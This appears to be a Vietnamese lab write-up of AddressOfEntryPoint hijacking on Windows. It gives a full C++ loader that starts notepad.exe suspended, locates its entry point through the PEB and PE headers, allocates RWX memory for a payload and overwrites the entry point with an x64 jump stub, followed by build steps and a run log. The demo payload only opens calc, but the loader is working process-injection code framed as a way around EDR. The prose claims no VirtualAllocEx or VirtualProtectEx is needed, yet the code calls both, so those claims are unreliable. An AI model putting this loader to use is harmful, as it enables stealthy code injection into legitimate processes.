
---

# 📝 [PE 10] AddressOfEntryPoint Injection (EntryPoint Hijacking)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**AddressOfEntryPoint Injection (Bắt cóc điểm nhập tiến trình)** đại diện cho một giải thuật can thiệp và bẻ hướng dòng chảy thực thi (Control Flow Redirection) nâng cao, thuộc nhóm kỹ thuật **Né tránh phòng thủ động dựa trên cấu trúc mô-đun Image có sẵn (Image-Native Dynamic Evasion)**.

Hầu hết các giải pháp Endpoint Detection and Response (EDR) hiện đại đều thiết lập các bộ lọc Heuristic giám sát rất nặng hành vi của một tiến trình khi nó liên tục yêu cầu cấp phát các vùng nhớ mới mang đặc quyền thực thi chéo tiến trình thông qua API `VirtualAllocEx`.

Dự án PE 10 hóa giải triệt để rào cản trinh sát này bằng chiến thuật **Không sinh phân vùng thực thi lạ**. Giải thuật tận dụng và ghi đè trực tiếp mìn điều hướng mã máy vào phân đoạn thực thi mang cờ **`PAGE_EXECUTE_READ` (RX)** mặc định, hợp pháp sẵn có ngay tại điểm xuất phát **`AddressOfEntryPoint`** của ứng dụng vỏ bọc (ví dụ: `notepad.exe`). Bằng cách phối hợp trạng thái đóng băng tiến trình sơ khởi và kỹ thuật vá mã máy Inline JMP x64, Loader ép luồng thực thi chính thức của đối phương tự động chuyển hướng sang Payload của ta ngay khi rã đông mà không cần tạo thêm bất kỳ luồng phụ nào.

### 🎯 Mục tiêu nghiên cứu:

* **Bypass cơ chế phát hiện cấp phát RAM thực thi**: Loại bỏ hoàn toàn sự phụ thuộc vào việc thay đổi cờ bảo vệ bộ nhớ thô, bẻ gãy các bộ lọc kiểm soát hành vi allocation của EDR.
* **Giải phẫu cấu trúc định vị EntryPoint**: Thao túng cấu trúc ngữ cảnh thanh ghi CPU phần cứng để bóc tách bản đồ cấu trúc tệp PE từ xa tại thời điểm runtime.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong định dạng tệp tin Portable Executable (PE Format), điểm thực thi lệnh CPU đầu tiên của một ứng dụng sau khi hoàn tất thủ tục nạp bộ nhớ được định nghĩa bởi trường dữ liệu `AddressOfEntryPoint` lưu trữ lọt lòng trong cấu trúc bọc `IMAGE_OPTIONAL_HEADER`.

Quy trình toán học giải phẫu ngữ cảnh và chiếm quyền điều phối dòng chảy CPU của Lab PE 10 diễn ra qua 4 giai đoạn ngầm tại tầng Kernel:

```
[CreateProcessW: Khởi tạo tiến trình vỏ bọc ở trạng thái CREATE_SUSPENDED]
       └──> [ReadProcessMemory: Bóc cấu trúc PEB -> Trích xuất ImageBaseAddress]
                 └──> [Giải phẫu NT Header: Tính toán tọa độ tuyệt đối EntryPointAddress]
                           └──> [WriteProcessMemory: Vá mìn điều hướng Inline JMP Stub x64]

```
<br>
<img width="1704" height="2622" alt="image" src="https://github.com/user-attachments/assets/38dac393-c3bc-4cb3-9ea8-6590796fcebd" />



1. **Truy vết bản đồ địa chỉ nạp (`ImageBaseAddress`)**: Khi luồng chính (Main Thread) của tiến trình vỏ bọc bị hoãn lệnh sơ khởi (`CREATE_SUSPENDED`), hệ điều hành nạp địa chỉ trỏ đến cấu trúc quản lý **PEB** của nạn nhân vào thanh ghi phần cứng **`Rdx`** của CPU. Loader phát lệnh `ReadProcessMemory` bốc tách ô nhớ tại vị trí offset `0x10` của PEB để lấy chính xác tọa độ nạp thực tế ImageBaseAddress của Notepad trên RAM.
2. **Toán học định vị tọa độ xuất phát tuyệt đối**: Loader đọc $4\text{ KB}$ phân đoạn PE Headers đầu tiên của nạn nhân sang một bộ đệm cục bộ, ép kiểu cấu trúc dữ liệu về bản ghi **`PIMAGE_NT_HEADERS64`** chuẩn chỉ x64 để tính toán ô nhớ đích theo công thức:

$$\text{EntryPointAddress} = \text{ImageBaseAddress} + \text{ntHeaders.OptionalHeader.AddressOfEntryPoint}$$


3. **Khai hỏa JMP Stub (Ma trận ghi đè Inline)**: Mặc dù phân đoạn bộ nhớ chứa EntryPoint mặc định mang quyền `RX` bảo an nghiêm ngặt, hàm API Subsystem **`WriteProcessMemory`** của Windows chứa một cơ chế ngầm đặc biệt (Bypass ngầm của Kernel): Khi một tiến trình có đầy đủ quyền Handle (`PROCESS_VM_WRITE | PROCESS_VM_OPERATION`) phát lệnh ghi đè vào một trang nhớ thuộc loại `MEM_IMAGE` mang quyền Đọc/Thực thi, Kernel Windows sẽ tự động lật cờ trang nhớ đó sang `RWX` một cách tạm thời, thực hiện ghi đè mảng byte mã máy Assembly vào, rồi tự động hoàn trả lại cờ `RX` ban đầu sau khi tác vụ kết thúc. Cơ chế này giúp Loader hoàn toàn không cần gọi đến hàm lật cờ bảo vệ bộ nhớ `VirtualProtectEx` lộ liễu.
4. **Giải phóng tháp luồng (`ResumeThread`)**: Trình lập lịch CPU thức dậy, nạp lại ngữ cảnh thanh ghi, đưa luồng chính vào trạng thái thực thi trực tiếp trên vạch EntryPoint đã bị tráo đổi mã máy.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp: 
```cpp
#include <windows.h>
#include <iostream>
#include <vector>
#include <string>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí sẽ gánh luồng chạy sau khi bị điều hướng
DWORD WINAPI RemoteEntryPointPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Gọi bằng con trỏ tuyệt đối, né sạch hàng rào địa chỉ tương đối
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    // Giữ luồng sống để tiến trình vỏ bọc không bị sụp đổ bất ngờ sau khi mở calc
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Giải thuật chủ động định vị đường dẫn hệ thống thích ứng (Zero Static Buffers)
std::wstring GetActiveSystemPath(const std::wstring& exeName) {
    // Bước 1: Gọi truyền con chỉ NULL để OS tự tính kích thước vùng nhớ cần thiết
    UINT requiredSize = GetSystemDirectoryW(NULL, 0);
    if (requiredSize == 0) return L"";

    // Bước 2: Cấp phát động mảng vừa khít để hứng chuỗi
    std::vector<wchar_t> buffer(requiredSize);
    if (GetSystemDirectoryW(buffer.data(), requiredSize) == 0) return L"";

    std::wstring finalPath(buffer.data());
    finalPath += L"\\" + exeName; // Ghép toán học chuỗi tên tiến trình mục tiêu
    return finalPath;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 10: ENTRYPOINT HIJACKING" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Định vị động bản đồ thư mục hệ thống thực tế
    std::wstring targetExe = L"notepad.exe";
    std::wstring dynamicPath = GetActiveSystemPath(targetExe);

    if (dynamicPath.empty()) {
        std::cerr << "[-] Khong the chu dong xac dinh duong dan he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::wcout << L"[+] Da chu dong dinh vi tien trinh vo boc: " << dynamicPath << std::endl;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    // ─── BƯỚC 1: KHỞI TẠO TIẾN TRÌNH VỎ BỌC Ở TRẠNG THÁI ĐÓNG BĂNG ───
    std::cout << "[*] Dang khoi tao tien trinh vo boc o trang thai dong bang..." << std::endl;
    BOOL success = CreateProcessW(
        NULL,
        const_cast<LPWSTR>(dynamicPath.c_str()),
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED, // Đóng băng luồng chính ngay vạch xuất phát
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "[-] Failed to create suspended process! Error: " << GetLastError() << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tien trinh vo boc duoc tao voi PID: " << pi.dwProcessId << std::endl;

    // ─── BƯỚC 2: TRÍCH XUẤT NGỮ CẢNH VÀ ĐỊNH VỊ ENTRYPOINT TỪ XA ───
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);

    // Đọc địa chỉ Base Address của mục tiêu từ cấu trúc PEB thông qua thanh ghi Rdx trên x64
    PVOID baseAddress = NULL;
    ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + 0x10), &baseAddress, sizeof(PVOID), NULL);
    std::cout << "[+] Toa do Base Address cua Notepad: 0x" << std::hex << baseAddress << std::endl;

    // Phân tích thủ công cấu trúc DOS/NT Header của file trên RAM để tìm AddressOfEntryPoint
    BYTE headersBuffer[4096];
    if (!ReadProcessMemory(pi.hProcess, baseAddress, headersBuffer, sizeof(headersBuffer), NULL)) {
        std::cerr << "[-] Khong the doc PE Header tu xa!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
    // ĐỒNG BỘ X64: Định nghĩa tường minh kiến trúc 64-bit bảo đảm tính toán toán học chuẩn xác
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(headersBuffer + dosHeader->e_lfanew);

    // Tính toán tọa độ ô nhớ tuyệt đối vạch xuất phát EntryPoint trên RAM của nạn nhân
    PVOID entryPointAddress = (PVOID)((ULONG_PTR)baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    std::cout << "[+] Toa do EntryPoint tuyet doi can Hijack: 0x" << std::hex << entryPointAddress << std::endl;

    // Quy trình cấp phát động thích ứng vừa vặn (Zero Static Buffers)
    SIZE_T functionSize = 500;

    // ─── BƯỚC 3: CẤP PHÁT PHÂN VÙNG NHỚ AN TOÀN CHO PAYLOAD ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx tai tien trinh dich that bai!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code payload tu xa thiet lap tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // ─── BƯỚC 4: KHỞI TẠO CON TRỎ TUYỆT ĐỐI VÀ ĐẨY SANG RAM ĐÍCH ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    WriteProcessMemory(pi.hProcess, remoteCodeBuffer, (LPCVOID)RemoteEntryPointPayload, functionSize, NULL);
    WriteProcessMemory(pi.hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // ─── BƯỚC 5: LẬT QUYỀW VÀ GHI ĐÈ LỆNH NHẢY JMP STUB TẠI ENTRYPOINT ───
    DWORD oldProtect = 0;
    std::cout << "[*] Dang dung VirtualProtectEx de mo khoa vung nho EntryPoint..." << std::endl;
    if (VirtualProtectEx(pi.hProcess, entryPointAddress, 32, PAGE_EXECUTE_READWRITE, &oldProtect)) {

        // Đoạn mã máy nhảy tuyệt đối x64 bẻ hướng dòng chảy CPU đâm thẳng vào Payload của ta
        unsigned char jmpStub[] = {
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0 (Nạp địa chỉ tham số dữ liệu tuyệt đối)
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0 (Nạp địa chỉ hàm xử lý mã máy)
            0xFF, 0xE0                                                  // jmp rax
        };

        // Vá tọa độ tuyệt đối chính xác vào cấu trúc mã máy nạp RAM
        *(DWORD_PTR*)(jmpStub + 2) = (DWORD_PTR)pRemoteData;
        *(DWORD_PTR*)(jmpStub + 12) = (DWORD_PTR)remoteCodeBuffer;

        // Ghi đè trực tiếp mìn điều hướng bẻ dòng chảy CPU thẳng vào vạch xuất phát EntryPoint hợp pháp
        WriteProcessMemory(pi.hProcess, entryPointAddress, jmpStub, sizeof(jmpStub), NULL);

        // Khôi phục lại bảo vệ trang nhớ ban đầu để xóa sạch dấu vết can thiệp của giải pháp an ninh
        VirtualProtectEx(pi.hProcess, entryPointAddress, 32, oldProtect, &oldProtect);
        std::cout << "[+] Da cai dat JMP Stub dieu huong thanh cong tai EntryPoint goc!" << std::endl;
    }
    else {
        std::cerr << "[-] Khong the mo khoa trang nho EntryPoint!" << std::endl;
    }

    // ─── BƯỚC 6: RÃ ĐÔNG LUỒNG THỰC THI CHÍNH THỨC KHAI HỎA ───
    std::cout << "[*] Kich hoat ra dong (ResumeThread) de luong chinh tu dong kich no..." << std::endl;
    ResumeThread(pi.hThread);

    // Sử dụng cờ kết thúc đồng bộ, dọn dẹp triệt để Handle chống rò rỉ bộ nhớ (Memory Leak)
    std::cout << "\n[+] EntryPoint Hijacking (Active Path Custom) Successful!" << std::endl;
    std::cout << "[*] Nhan phim Enter de don dep va dong cua so..." << std::endl;
    std::cin.get();

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm file `.exe` Loader vận hành mượt mà, độc lập, không bị phụ thuộc vào các gói runtime bọc ngoài khi mang sang triển khai thực nghiệm trên môi trường sạch:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình sang định dạng cờ liên kết tĩnh **`Multi-threaded (/MT)`**.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân chuẩn chỉ sạch bóng.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khai hỏa file thực thi Loader thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô để theo dõi ma trận can thiệp điểm nhập:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE10_AddressOfEntryPoint_Code_Injection\x64\Release> C:\Users\Admin\source\repos\Task6\PE10_AddressOfEntryPoint_Code_Injection\x64\Release\AddressOfEntryPoint_Code_Injection.exe
====================================================
[*] PE 10: ENTRYPOINT HIJACKING
====================================================
[+] Da chu dong dinh vi tien trinh vo boc: C:\WINDOWS\system32\notepad.exe
[*] Dang khoi tao tien trinh vo boc o trang thai dong bang...
[+] Tien trinh vo boc duoc tao voi PID: 13160
[+] Toa do Base Address cua Notepad: 0x00007FF7AFEA0000
[+] Toa do EntryPoint tuyet doi can Hijack: 0x00007FF7B0002230
[+] Vung nho Code payload tu xa thiet lap tai: 0x000001A570AF0000
[*] Dang dung VirtualProtectEx de mo khoa vung nho EntryPoint...
[+] Da cai dat JMP Stub dieu huong thanh cong tai EntryPoint goc!
[*] Kich hoat ra dong (ResumeThread) de luong chinh tu dong kich no...

[+] EntryPoint Hijacking (Active Path Custom) Successful!
[*] Nhan phim Enter de don dep va dong cua so...

```

### Demo:
<img width="1920" height="600" alt="devenv_tGA4OwexAp" src="https://github.com/user-attachments/assets/85f9bc61-776f-4b43-b956-cf2ed38de4e6" />


--- 
